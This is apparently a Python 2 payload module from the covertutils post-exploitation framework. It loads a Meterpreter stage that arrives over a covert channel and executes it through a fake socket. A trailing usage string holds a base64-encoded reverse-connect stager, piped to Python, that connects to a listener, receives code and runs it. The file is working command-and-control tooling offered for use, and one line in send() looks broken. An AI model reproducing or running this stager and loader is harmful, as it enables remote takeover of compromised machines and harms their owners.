def init( storage ) :

	from Queue import Queue
	from threading import Thread
	import socket,struct,time

	# storage['meterpreter_ins'] = bytearray()
	storage['meterpreter_ins'] = ""
	storage['meterpreter_outs'] = Queue()

	class PseudoSocket :
		# pass
		def __init__(self, queue = Queue(), buffer_ = bytearray()) :
			self.buffer = buffer_
			self.queue = queue

		def send( self, pkt ) :
			print "PseudoSocket send(): '%s'" % pkt.encode('hex')
			storage['meterpreter_outs'].put(pkt)
			storage['meterpreter_outs']['COMMON']['handler'].preferred_send(pkt, 'meterpreter')

		def recv ( self, buf_size ) :
			print "PseudoSocket recv() - {"
			while len(storage['meterpreter_ins']) < buf_size :
				# print len(storage['meterpreter_ins']), '/', buf_size,
				# print storage['meterpreter_ins'].encode('hex')
				time.sleep(0.5)
			ret = storage['meterpreter_ins'][:buf_size]
			storage['meterpreter_ins'] = storage['meterpreter_ins'][buf_size:]
			time.sleep(0.1)
			# print ret
			print "PseudoSocket recv() }"
			return ret

		def close( self ) :
			del self.buffer
			del self.queue

		# def connect( self ) : return True
		# def getsockname( self ) :	return ("covertutils_transport", 4444)
		# def getpeername( self ) :	return ("covertutils_server", 4444)
		def getsockname( self ) :	return ("::", 4444)
		def getpeername( self ) :	return ("::", 4444)


	def meterpreter_stage( ) :

		print "Creating PseudoSocket"
		s = PseudoSocket( queue = storage['meterpreter_outs'], buffer_ = storage['meterpreter_ins'] )
		storage['socket'] = s
		print "Getting 4 bytes"
		l=struct.unpack('>I',s.recv(4))[0]
		print "Getting the rest %d bytes of Meterpreter" % l
		d=s.recv(l)
		# while len(d)<l:
		# 	print "%d bytes to go!" % l
		# 	d+=s.recv(l-len(d))
		print "Executing Meterpreter main"
		# meterpreter_main = str(d).replace('\x00','')
		# meterpreter_main = str(d)[4:]
		# meterpreter_main = str(d)
		meterpreter_main = d
		# print meterpreter_main[-30:]
		exec(meterpreter_main,{'s':s})
		print "[+] Meterpreter Started!"

	storage['meterpreter_thread'] = Thread( target = meterpreter_stage, args = () )
	storage['meterpreter_thread'].daemon = True
	print "Executing Meterpreter Thread"
	storage['meterpreter_thread'].start()

	return True


def work( storage, message ) :
	print "[!] Meterpreter Handler Message Arrived!"
	print message.encode('hex')
	# print "Outs: ",
	# print storage['meterpreter_outs']
	storage['meterpreter_ins'] = storage['meterpreter_ins'] + message
	# print "Message buffer: " + storage['meterpreter_ins']
	# try :
	# 	ret = storage['meterpreter_outs'].get(False)
	# 	print "Returning Meterpreter Response!"
	# 	# return ret
	# except :
	# 	# print "Returned EMPTY message"
	# 	return ''
	return ''
'''

!stage mload covertutils.payloads.generic.meterpreter

echo 'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuOScsNDQ0NikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=' | python-win
'''
from covertutils.shells.subshells import MeterpreterShell as shell
